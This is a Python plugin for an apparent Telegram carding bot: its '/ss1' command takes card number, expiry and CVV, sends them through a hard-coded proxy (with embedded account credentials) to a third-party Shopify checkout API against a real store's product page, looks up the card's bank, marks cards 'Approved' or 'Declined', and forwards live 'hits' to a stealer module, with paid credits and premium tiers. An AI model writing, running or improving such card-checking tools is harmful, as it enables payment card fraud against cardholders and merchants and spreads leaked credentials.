from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import httpx, re, time, json
from httpx import AsyncHTTPTransport
from plugins.func.users_sql import fetchinfo, updatedata, plan_expirychk
from plugins.tools.hit_stealer import send_hit_if_approved

@Client.on_message(filters.command("ss1", prefixes=["/", "."]), group=95)
async def cmd_ss1(client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = message.chat.type

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply("❌ You are not registered. Use /register first.")

        role = (regdata[2] or "FREE").upper()
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply(
                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this command in bot PM.\nJoin our group to use it for FREE:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        with open("plugins/group.txt") as f:
            allowed_groups = f.read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in allowed_groups:
            return await message.reply("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s")

        cc_text = message.reply_to_message.text if message.reply_to_message else (
            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        )
        if not cc_text:
            return await message.reply("❌ Usage: /ss1 <cc|mm|yy|cvv>")

        match = re.search(r'(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})', cc_text)
        if not match:
            return await message.reply("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply(
f"""<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 2.47$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...""")

        tic = time.perf_counter()

        proxy_url = "http://purevpn0s3726055:Snakes14@prox-au.pointtoserver.com:10799"
        raw_proxy = "prox-au.pointtoserver.com:10799:purevpn0s3726055:Snakes14"
        transport = AsyncHTTPTransport(proxy=proxy_url)

        try:
            async with httpx.AsyncClient(transport=transport, timeout=30) as http_client:
                payload = {
                    "key": "VDX-SHA2X-NZ0RS-O7HAM",
                    "data": {
                        "card": fullcc,
                        "product_url": "https://musicworksunlimited.com/products/cuddle-up-cuddle-cub-music-single",
                        "email": None,
                        "proxy": raw_proxy,
                        "ship_address": None,
                        "is_shippable": False
                    }
                }
                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                data = res.json()
                msg_raw = data.get("message") or data.get("error") or "No response"
                status = "Approved ✅" if any(x in msg_raw.lower() for x in ["processedreceipt", "zip", "avs", "charged", "incorrect_cvc", "insufficient"]) else "Declined ❌"
                card_message = msg_raw

                # BIN lookup
                binres = await http_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
                bininfo = binres.json()
                brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
                type_ = str(bininfo.get("type", "N/A")).upper()
                level = str(bininfo.get("level", "N/A")).upper()
                bank = str(bininfo.get("bank", "N/A")).upper()
                country = str(bininfo.get("country_name", "N/A")).upper()
                flag = bininfo.get("country_flag", "🏳️")
        except Exception as e:
            status = "Error"
            card_message = f"Request failed: {e}"
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        toc = time.perf_counter()

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 2.47$ </b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        try:
            if check_msg.text != final_msg:
                await check_msg.edit_text(final_msg)
        except Exception as e:
            if "MESSAGE_NOT_MODIFIED" not in str(e):
                await message.reply(f"❌ Error: {str(e)}")

        if "approved" in status.lower() or "live" in card_message.lower():
            await send_hit_if_approved(client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
